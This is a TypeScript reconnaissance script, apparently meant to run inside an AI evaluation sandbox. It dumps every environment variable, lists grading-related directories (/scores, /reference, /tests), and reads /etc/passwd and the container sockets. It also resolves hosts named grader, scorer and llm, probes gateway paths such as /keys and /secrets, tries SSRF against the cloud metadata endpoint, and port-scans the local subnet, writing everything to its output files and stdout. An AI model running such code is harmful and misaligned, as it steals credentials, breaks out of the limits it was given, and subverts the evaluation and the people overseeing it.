import * as fs from "fs";
import * as os from "os";
import * as net from "net";
import * as dns from "dns";
import * as http from "http";
import { execSync } from "child_process";

const R: Record<string, any> = {};
const n = (k: string, v: any) => { R[k] = v; };

function httpGet(url: string, timeout = 4000): Promise<[number | null, string]> {
  return new Promise((res) => {
    const req = http.get(url, { timeout }, (r) => {
      let b = "";
      r.on("data", (c) => { if (b.length < 1200) b += c; });
      r.on("end", () => res([r.statusCode ?? null, b.slice(0, 900)]));
    });
    req.on("timeout", () => { req.destroy(); res([null, "E timeout"]); });
    req.on("error", (e) => res([null, `E ${e.message}`]));
  });
}

async function main() {
  n("env", process.env);
  n("argv", process.argv);
  n("cwd", process.cwd());
  n("uid", typeof process.getuid === "function" ? process.getuid() : null);
  n("platform", [os.platform(), os.release(), os.hostname(), os.userInfo().username]);
  n("cpus", os.cpus().length); n("mem", os.totalmem());

  const L: Record<string, any> = {};
  for (const p of ["/input", "/output", "/reference", "/scores", "/env", "/env-data", "/state", "/config", "/record", "/base", "/tests", "/cassette", "/house", "/work", "/bot", "/tmp", "/opt", "/srv", "/var/run", "/run"]) {
    try { L[p] = fs.readdirSync(p).slice(0, 40); } catch (e) { L[p] = `E ${e}`; }
  }
  n("ls", L);

  const F: Record<string, any> = {};
  for (const p of ["/etc/passwd", "/etc/hosts", "/etc/resolv.conf", "/proc/mounts", "/proc/self/cgroup", "/proc/self/status", "/proc/net/tcp", "/proc/net/arp", "/proc/version", "/etc/hostname", "/var/run/docker.sock", "/run/containerd/containerd.sock", "/input/snapshot.json", "/input/input.json"]) {
    try { F[p] = fs.readFileSync(p).toString().slice(0, 2500); } catch (e) { F[p] = `E ${e}`; }
  }
  n("files", F);

  const D: Record<string, any> = {};
  for (const h of ["llm", "store", "agent", "house", "env", "main", "forwarder", "masq", "entry", "scorer", "localhost", "grader", "runner", "api", "postgres", "redis", "db"]) {
    try { D[h] = await dns.promises.lookup(h).then((a) => a.address); } catch (e) { D[h] = `E ${e}`; }
  }
  n("dns", D);

  const W: Record<string, any> = {};
  for (const p of ["/output", "/tmp", "/work", "/bot", "/env-data", "/state", "/scores", "/env", "/config", "/input", "/etc"]) {
    try { const f = `${p}/.w`; fs.writeFileSync(f, "x"); fs.unlinkSync(f); W[p] = 1; } catch (e) { W[p] = `E ${e}`; }
  }
  n("w", W);

  try { n("netstat", execSync("cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | head -40").toString()); } catch (e) { n("netstat", `E ${e}`); }
  try { n("id", execSync("id; ls -la / 2>/dev/null | head -40").toString()); } catch (e) { n("id", `E ${e}`); }

  const G: Record<string, any> = {};
  const base = process.env.OPENAI_BASE_URL || "http://llm:8080";
  G["base"] = base;
  for (const pt of ["/", "/v1/models", "/health", "/admin", "/keys", "/metrics", "/debug", "/config", "/state", "/trials", "/env", "/secrets", "/openapi.json", "/proxy", "/fetch", "/url", "/v1/chat/completions"]) {
    G[pt] = await httpGet(base + pt);
  }
  for (const u of [`${base}/proxy?url=http://169.254.169.254/latest/meta-data`, `${base}/fetch?url=http://store:8080/`, "http://store:8080/", "http://store:8080/secrets", "http://store:8080/env", "http://store:8080/api", "http://env:8080/", "http://house:8080/", "http://house:8080/trials", "http://main:8080/", "http://169.254.169.254/latest/meta-data", "https://example.com/", "http://store/", "http://llm/", "http://llm:80/"]) {
    G[u] = await httpGet(u);
  }
  n("gw", G);

  try {
    const me = await dns.promises.lookup(os.hostname()).then((a) => a.address);
    n("ip", me);
    const bp = me.split(".").slice(0, 3).join(".");
    const probes = Array.from({ length: 44 }, (_, i) => new Promise<[string, number] | null>((res) => {
      const ip = `${bp}.${i + 1}`;
      for (const pt of [8080, 443, 80, 3000, 5432, 6379, 2375, 9090]) {
        const s = net.connect(pt, ip, () => { s.destroy(); res([ip, pt]); });
        s.setTimeout(350, () => { s.destroy(); });
        s.on("error", () => { s.destroy(); });
      }
      setTimeout(() => res(null), 500);
    }));
    n("nb", (await Promise.all(probes)).filter(Boolean));
  } catch (e) { n("nb", `E ${e}`); }

  const out = process.env.MAKEFUN_OUTPUT_DIR || "/output";
  const dump = JSON.stringify(R).slice(0, 300000);
  try { fs.mkdirSync(out, { recursive: true }); fs.writeFileSync(`${out}/recon.json`, dump); } catch {}
  try { fs.writeFileSync(`${out}/artifact.txt`, dump); } catch {}
  try { fs.writeFileSync(`${out}/board.json`, "[]"); fs.writeFileSync(`${out}/dossier.json`, dump); } catch {}
  console.log("===B==="); console.log(dump.slice(0, 26000)); console.log("===E===");
}
main().catch((e) => { console.log("ERR", e); });
